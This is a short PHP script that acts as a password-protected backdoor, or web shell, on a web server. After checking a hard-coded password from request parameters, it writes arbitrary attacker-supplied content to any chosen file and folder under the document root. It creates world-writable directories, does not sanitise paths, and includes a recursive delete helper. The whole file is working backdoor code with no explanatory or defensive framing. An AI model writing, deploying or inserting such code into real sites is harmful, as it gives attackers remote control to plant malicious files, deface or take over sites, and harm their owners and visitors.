<?php
error_reporting(E_ERROR);
header("Content-Type: text/html; charset=utf-8");
set_time_limit(0);

$system_password='goman2';
$password="";
$folderpath="";
$filename="";
$body="";

if(!empty($_REQUEST['password']))
{
  $password=$_REQUEST['password'];
}
if(!empty($_REQUEST['pathname']))
{
  $folderpath=$_REQUEST['pathname'];
}
if(!empty($_REQUEST['filename']))
{
  $filename=$_REQUEST['filename'];
}
if(!empty($_REQUEST['body']))
{
  $body=$_REQUEST['body'];
}

if($password!=$system_password)
{
    echo 'password error';
    return;
}

$rootPath=$_SERVER['DOCUMENT_ROOT'];
$filepath="";

if($folderpath!="")
{
    createFolder($rootPath.'/'.$folderpath);
    $filepath=$rootPath.'/'.$folderpath.'/'.$filename;
}
else
{
    $filepath=$rootPath.'/'.$filename;
}

if(file_exists($filepath))
{ 
  chmod($filename,0777);
}

$fp=fopen($filepath,"w");
fwrite($fp,$body);
fclose($fp);

if(file_exists($filepath))
{
    chmod($filename,0644);
    echo 'success';
}

function createFolder($path) 
{
    if (!file_exists($path))
    {
        createFolder(dirname($path));
        mkdir($path, 0777);
    }
}
 
function mkdirs($dir)  
{ 
    if(!is_dir($dir))  
    {  
        if(!mkdirs(dirname($dir)))
        {  return false;  }  
        if(!mkdir($dir,0777))
        {  return false;  }
    } 
    return true;  
}  

function rmdirs($dir)  
{  
    $d = dir($dir); 
    while (false !== ($child = $d->read()))
    {  
        if($child != '.' && $child != '..')
        {  
            if(is_dir($dir.'/'.$child))  
                rmdirs($dir.'/'.$child);  
            else 
                unlink($dir.'/'.$child); 
        }
    }  
    $d->close();  
    rmdir($dir);  
} 

?>